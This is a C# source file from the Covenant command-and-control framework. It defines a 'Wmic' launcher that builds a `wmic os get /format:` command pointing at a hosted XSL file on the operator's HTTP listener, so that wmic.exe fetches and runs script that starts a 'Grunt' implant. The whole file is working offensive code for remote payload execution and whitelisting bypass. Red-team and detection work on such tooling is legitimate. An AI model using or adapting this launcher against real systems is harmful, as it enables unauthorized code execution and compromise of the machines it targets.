// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using Microsoft.CodeAnalysis;

using Covenant.Models.Listeners;

namespace Covenant.Models.Launchers
{
    public class WmicLauncher : ScriptletLauncher
    {
        public WmicLauncher()
        {
            this.Name = "Wmic";
            this.Type = LauncherType.Wmic;
            this.Description = "Uses wmic.exe to launch a Grunt using a COM activated Delegate and ActiveXObjects (ala DotNetToJScript). Please note that DotNetToJScript-based launchers may not work on Windows 10 and Windows Server 2016.";
            this.ScriptType = ScriptletType.Stylesheet;
            this.OutputKind = OutputKind.DynamicallyLinkedLibrary;
            this.CompressStager = false;
        }
        protected override string GetLauncher()
        {
            string launcher = "wmic os get /format:\"" + "file.xsl" + "\"";
            this.LauncherString = launcher;
            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
				Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                string launcher = "wmic os get /format:\"" + hostedLocation + "\"";
                this.LauncherString = launcher;
                return launcher;
            }
            else { return ""; }
        }
    }
}
